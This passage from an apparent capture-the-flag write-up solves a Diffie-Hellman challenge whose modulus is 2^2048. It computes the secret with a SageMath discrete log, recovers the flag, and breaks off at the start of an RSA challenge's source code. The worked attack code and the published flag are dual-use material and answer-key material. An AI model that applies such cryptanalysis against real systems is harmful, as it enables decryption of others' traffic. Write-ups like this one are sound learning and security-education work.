style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\" loading=\"lazy\" decoding=\"async\">\n  </a>\n    </span>\n<p>Following the steps, with <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">g =</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span></span><code>base</code>, <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">h =</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span></span> <code>my_mix</code> and <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">n =</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span></span> <code>pallete</code> <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>=</mo><msup><mn>2</mn><mn>2048</mn></msup></mrow><annotation encoding=\"application/x-tex\">= 2^{2048}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2048</span></span></span></span></span></span></span></span></span></span></span></span></span>:</p>\n<ol>\n<li><span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span></span> has only one prime factor: <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">p_i = 2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span></span></span></span></span>, <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>=</mo><mn>2048</mn></mrow><annotation encoding=\"application/x-tex\">e_i = 2048</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2048</span></span></span></span></span>\n<ol>\n<li>Since <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>=</mo><msubsup><mi>p</mi><mi>i</mi><msub><mi>e</mi><mi>i</mi></msub></msubsup></mrow><annotation encoding=\"application/x-tex\">n = p_i^{e_i}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.023156em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.746292em;\"><span style=\"top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.1449000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span></span></span></span></span>, it follows that <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>g</mi><mi>i</mi></msub><mo>=</mo><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g_i = g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span></span> and</li>\n<li><span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mi>i</mi></msub><mo>=</mo><mi>h</mi></mrow><annotation encoding=\"application/x-tex\">h_i = h</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span></span></span></span></span></li>\n<li><span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>g</mi><mi>i</mi><msub><mi>x</mi><mi>i</mi></msub></msubsup><mo>=</mo><msub><mi>h</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">g_i^{x_i} = h_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.023156em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.746292em;\"><span style=\"top:-2.4231360000000004em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span><span style=\"top:-3.1449000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span> implies that <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>h</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><mrow><mi>log</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><msub><mi>g</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">x_i = \\frac{\\log(h_i)}{\\log(g_i)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.53em;vertical-align:-0.52em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.01em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mop mtight\"><span class=\"mtight\">l</span><span class=\"mtight\">o</span><span class=\"mtight\" style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen mtight\">(</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mclose mtight\">)</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.485em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mop mtight\"><span class=\"mtight\">l</span><span class=\"mtight\">o</span><span class=\"mtight\" style=\"margin-right:0.01389em;\">g</span></span><span class=\"mopen mtight\">(</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3280857142857143em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.52em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></li>\n</ol>\n</li>\n<li>The only equation to solve is <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>≡</mo><msub><mi>x</mi><mi>i</mi></msub><mspace></mspace><mspace width=\"0.4444444444444444em\"></mspace><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow><mspace width=\"0.3333333333333333em\"></mspace><msup><mn>2</mn><mn>2048</mn></msup><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">x \\equiv x_i \\pmod{2^{2048}}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.46375em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace allowbreak\"></span><span class=\"mspace\" style=\"margin-right:0.4444444444444444em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.064108em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathrm\">mod</span></span></span><span class=\"mspace\" style=\"margin-right:0.3333333333333333em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2048</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></li>\n</ol>\n<p>However, we know that <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span></span> is an integer from <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span></span> to <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">n-1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></span>, hence <code>% 2^2048</code> is a no-op, giving us the final result: <span class=\"math math-inline\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>=</mo><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x_i = x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span></span>.</p>\n<p>Thus, we find our secret by computing <code>log(my_mix, base)</code>. We should also note that <code>my_mix</code> must be an element of a cyclic group of order <code>palette</code>. Using SageMath to help us with these calculations:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> palette<span class=\"token operator\">=</span><span class=\"token number\">32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521914333389668342420684974786564569494856176035326322058077805659331026192708460314150258592864177116725943603718461857357598351152301645904403697613233287231227125684710820209725157101726931323469678542580656697935045997268352998638215525166389437335543602135433229604645318478604952148193555853611059596230656</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> base<span class=\"token operator\">=</span><span class=\"token number\">13489305024865487703110255658234329747698118206959778644688156332043783846078839120693894255527894489531905012244713117142764166452312133019772171674466933769775907460046497284522592167536594047800489828714315435570429416637425443402332599055774982796405757075108551322778712959943658831605397635195107786224617525627358659165255604556424206194207190437525742567525338826878962081515333896433312311548844614323540250054093970082337500580573165008440265840792908334486258260848163001490152587781983042546491301026074736907693887630347258892882871059741621049169714319440564952700454580681894452760215968494428411686329</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> my_mix<span class=\"token operator\">=</span><span class=\"token number\">6870295205307030503255600311283969014496436297715066273709495591567561187646528069669895230912327862244474990612611625088862250315706633708998214109152824455738719595737772769297517386968692628228327225922261219083693899105983726637012353264168761696183327692619506267951701511870035935612090359086376808592001973358166067468618577312983514388332736591060901174314042634365304017788649960016991442596975922402288221898367955532116456798868804571091463566329706023967280838744359633963847966790121312196824818606244189274966061324393424041211903396020720341163472399763951106703068172772579049891895580785347369093113</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> F <span class=\"token operator\">=</span> IntegerModRing<span class=\"token punctuation\">(</span>palette<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> secret <span class=\"token operator\">=</span> log<span class=\"token punctuation\">(</span>F<span class=\"token punctuation\">(</span>my_mix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> base<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> secret\n<span class=\"token number\">629921607003244034334739296597900783683872903809471621783318441724296155260647861566002145401774841786965516424821133148061140507283116747339148975177513485103967011207217568924993463569559551429141756952018711071204949930416859383037306197953684591391066287527469114753495090054370608519379326915615068308557735119497576999275516623932355604742058855833591651141407379343873413310424307672368844204423176033536465560324264458606570832918771689488513626547477988015235832957445514499444921298913651835294484177694907540420778298030233425343791552742606481998105977335541679798111463675261162481691943108104757462361</span></code></pre></div>\n<p>Now using our secret value, we can determine <code>shared_mix</code> and hence the flag!</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> your_mix <span class=\"token operator\">=</span> <span class=\"token number\">14317253516668543276504878316838097235650210449758621543536146016892160048656997634541093315774403078357942150970695487937570449270120625898199254439189104072891595263513437420116930684308702803055295267600790477195902538538739117809573391251939794413361184343367694928615752045687223262368136262534778688889202144260002584306527206705616186699377315031757095455954292951059462279988296369935635246644221722025457496936215039008069820514166063271894671978845634968761626636993374291118230179892722513818307254406450607168911057458141649111515924404215975886422961651958216688209696158879621701708955382424640000048217</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> painting <span class=\"token operator\">=</span> <span class=\"token number\">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751566466034447988065494130102242572713515917910688574332104680867377750329904425039785453961697828887505197701127086732126907914324992806733394244034438537271953062873710421922341053639880387051921552573241651939698279628619278357238684137922164483956735128373164911380749908774512869223017256152942356111845682044048514917460601214157119487675633689081081818805777951203838578632029105960085810547586385599419736400861419214277678792284994133722491622512615732083564207280344459191773058670866354126043620</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> shared_mix <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>your_mix<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> palette<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> flag <span class=\"token operator\">=</span> painting <span class=\"token operator\">^</span> shared_mix\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n<span class=\"token string\">'actf{powers_of_two_are_not_two_powerful}'</span></code></pre></div>\n<h3>Notes</h3>\n<p>SageMath also has a <code>discrete_log</code> function which could have easily found the secret:</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">>></span><span class=\"token operator\">></span> F <span class=\"token operator\">=</span> IntegerModRing<span class=\"token punctuation\">(</span>palette<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">>></span><span class=\"token operator\">></span> secret <span class=\"token operator\">=</span> discrete_log<span class=\"token punctuation\">(</span>F<span class=\"token punctuation\">(</span>my_mix<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> F<span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<hr>\n<h2>Wall-E</h2>\n<h3>Crypto - 130 points (didn't solve)</h3>\n<blockquote>\n<p>My friend and I have been encrypting our messages using RSA, but someone keeps intercepting and decrypting them! Maybe you can figure out what's happening?</p>\n<p>Author: lamchcl</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> getPrime<span class=\"token punctuation\">,</span> bytes_to_long<span class=\"token punctuation\">,</span> inverse\n<span class=\"token keyword\">from</span> secret <span class=\"token 